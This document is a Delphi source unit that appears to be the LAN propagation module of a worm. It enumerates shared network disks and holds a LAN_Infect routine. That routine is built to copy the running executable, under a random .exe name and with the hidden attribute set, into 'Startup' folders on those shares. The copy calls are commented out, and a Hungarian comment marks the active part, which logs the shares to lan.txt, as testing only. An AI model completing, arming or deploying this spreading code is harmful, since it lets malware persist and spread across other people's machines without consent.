UNIT LAN;

INTERFACE

USES
  Classes, ComCtrls, Utils;

TYPE
  PNetResourceA = ^TNETRESOURCEA;

  TNETRESOURCEA = RECORD
    dwScope       : DWORD;
    dwType        : DWORD;
    dwDisplayType : DWORD;
    dwUsage       : DWORD;
    lpLocalName   : pChar;
    lpRemoteName  : pChar;
    lpComment     : pChar;
    lpProvider    : pChar;
  END;

  TNetEnumThread = CLASS(TThread)
    ChildNode : STRING;
    TreeNode  : TTreeNode;
    FUNCTION  LAN_RandomFileName : STRING;
    PROCEDURE Execute; OVERRIDE;
    PROCEDURE LoadNetNode(NetNode: PNetResourceA);
    PROCEDURE LAN_Infect;
    PROCEDURE LAN_Search(Path,fSpec:STRING);
    PROCEDURE LAN_CopyFiles(Hide:BOOL;SourceFile,DestinationFile:STRING);
  END;

IMPLEMENTATION

VAR
  Error          : BYTE;
  NetworkDrivers : TStrings;

CONST
  Chars : STRING            = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdevghijklmnopqrstuvwxyz';
  RESOURCEUSAGE_CONNECTABLE = 1;
  RESOURCEDISPLAYTYPE_SHARE = 3;
  ERROR_NO_MORE_ITEMS       = 259;
  RESOURCE_GLOBALNET        = 2;
  RESOURCETYPE_DISK         = 1;
  RESOURCETYPE_ANY          = 0;
  ERROR_MORE_DATA           = 234;
  NO_ERROR                  = 0;
  FILE_ATTRIBUTE_HIDDEN     = 2;

FUNCTION WNetOpenEnum(dwScope,dwType,dwUsage:DWORD;lpNetResource:PNetResourceA; VAR lpEnum:DWORD):DWORD; STDCALL; EXTERNAL 'MPR.DLL' name 'WNetOpenEnumA';
FUNCTION WNetEnumResource(hEnum:DWORD;VAR lpCount:DWORD;lpBuffer:Pointer;VAR lpBufferSize:DWORD):DWORD; STDCALL; EXTERNAL 'MPR.DLL' name 'WNetEnumResourceA';
FUNCTION WNetCloseEnum(VAR lpEnum:DWORD):DWORD; STDCALL; EXTERNAL 'MPR.DLL' name 'WNetCloseEnum';
FUNCTION CopyFile2(lpExistingFileName,lpNewFileName:PChar;bFailIfExists:BOOL) : BOOL; STDCALL; EXTERNAL 'kernel32.dll' name 'CopyFileA';
FUNCTION SetFileAttributes(lpFileName : pchar;dwFileAttributes : longint) : longbool; STDCALL EXTERNAL 'kernel32.dll' name 'SetFileAttributesA';

FUNCTION TNetEnumThread.LAN_RandomFileName : STRING;
  VAR
  S              : STRING;
  FileNameLength : BYTE;
BEGIN
  FileNameLength:=Random(10)+5;
  REPEAT
    S:=S+Chars[Random(61)+1];
  UNTIL Length(S)=FileNameLength;
  RESULT:=S+'.exe';
END;

PROCEDURE TNetEnumThread.LAN_CopyFiles(Hide:BOOL;SourceFile,DestinationFile:STRING);
BEGIN
  CopyFile2(pChar(SourceFile),pChar(DestinationFile),False);
  IF Hide then SetFileAttributes(pChar(DestinationFile),FILE_ATTRIBUTE_HIDDEN);
END;

PROCEDURE TNetEnumThread.LAN_Search(Path,fSpec:STRING);
VAR
  D : TSearchRec;
BEGIN
  Error:=Findfirst(PCHAR(Path+fSpec),faAnyfile,D);
  WHILE Error=0 DO BEGIN
 //   LAN_CopyFiles(True,ApplicationName,path+fspec+'\'+LAN_RandomFileName);
    Error:=FindNext(D);
  END;
  Error:=FindFirst(Path+'*.*',faAnyfile,D);
  WHILE Error=0 DO BEGIN
    IF (D.Attr AND faDirectory = faDirectory)AND(D.Name[1]<>'.') THEN LAN_Search(Path+D.Name+'\',fSpec);
    Error:=FindNext(D);
  END;
END;

PROCEDURE TNetEnumThread.Execute;
BEGIN
  NetworkDrivers:=TStringList.Create;
  TreeNode:=NIL;
  LoadNetNode(NIL);
  LAN_Infect;
END;

PROCEDURE TNetEnumThread.LAN_Infect;
VAR
  I : DWORD;
  F : Text;
BEGIN
 // IF NetworkDrivers.Count>0 THEN FOR I:=0 TO NetworkDrivers.Count-1 DO LAN_Search(NetworkDrivers.Strings[I]+'\','Startup');

 // Az ez utani resz csak tesztelesi celokat szolgal

 assignfile(f,'lan.txt');
 rewrite(f);
 FOR I:=0 TO NetworkDrivers.Count-1 DO writeln(f,NetworkDrivers.Strings[I]+'\');
 closefile(f);

END;

PROCEDURE TNetEnumThread.LoadNetNode(NetNode:PNetResourceA);
VAR
  hEnum       : Cardinal;
  Count       : DWORD;
  BufSize     : DWORD;
  NR          : PNetResourceA;
  Buf         : PNetResourceA;
  R           : Integer;
  CurrentNode : TTreeNode;
BEGIN
  IF WNetOpenEnum(RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,NetNode,hEnum)<>NO_ERROR THEN Exit;
  BufSize:=$1;
  GetMem(Buf,BufSize);
  TRY
    WHILE True DO BEGIN
      Count:=$FFFFFFFF;                                                         // I wish to read ALL items
      R:=WNetEnumResource(hEnum,Count,Buf,BufSize);
      IF R=ERROR_MORE_DATA THEN BEGIN                                           // Oops ! The InitialSize is too small !
        Count:=$FFFFFFFF;                                                       // I wish to read ALL items
        FreeMem(Buf);
        GetMem(Buf,BufSize);
        R:=WNetEnumResource(hEnum,Count,Buf,BufSize);
      END;
      IF R=ERROR_NO_MORE_ITEMS THEN Break;                                      // All items are processed
//      IF R<>NO_ERROR THEN Abort;                                                // R is the error code. Process it!
      NR:=Buf;
      WHILE Count>0 DO BEGIN
        CurrentNode:=TreeNode;                                                  // Remember current position
        IF NR.lpRemoteName<>NIL THEN ChildNode:=STRING(NR.lpRemoteName) ELSE ChildNode:='';
        IF ((NR.dwUsage AND RESOURCEUSAGE_CONNECTABLE)<>0) AND
           (NR.dwType=RESOURCETYPE_DISK)AND                                     //Check only Disks
           (NR.dwDisplayType=RESOURCEDISPLAYTYPE_SHARE)AND                      //Check shared resources
           (Pos('CD Drive',ChildNode)=0)AND                                     //Do not check CD Drives
           (Copy(ChildNode,Length(ChildNode)-1,Length(ChildNode))<>'\A')AND     //Do not check A floppy drive
           (Copy(ChildNode,Length(ChildNode)-1,Length(ChildNode))<>'\B')        //Do not check B floppy drive
           THEN NetworkDrivers.Add(ChildNode);
        LoadNetNode(NR);
        TreeNode:=CurrentNode;                                                  // restore current position after modification
        INC(NR);
        DEC(Count);
      END;
    END;
    FINALLY
    WNetCloseEnum(hEnum);                                                       // Close handle
    FreeMem(Buf);                                                               // Free memory
  END;
END;

END.
